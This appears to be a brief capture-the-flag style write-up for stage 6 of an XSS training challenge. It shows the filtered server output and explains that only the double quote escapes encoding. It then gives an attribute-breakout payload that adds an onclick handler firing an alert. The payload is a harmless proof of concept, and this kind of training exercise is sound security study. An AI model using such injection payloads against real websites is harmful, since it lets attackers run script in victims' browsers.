# **XSS Challenges Stage 6**

First, insert the payload of Stage 4 again.

We get the feedback like following.
```
<input type="text" name="p1" size="50" value=""&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;&lt;a style="">
```
Except symbol: `"` , they all be HTML coded.

It seems that we can only insert some attribute like `onchange` , `onclick` or `onfocus`, etc.

Use the eazier one to trigger, of course, it's on your call.

`" onclick="alert(document.domain)`

![](https://i.imgur.com/MlK0KJn.png)

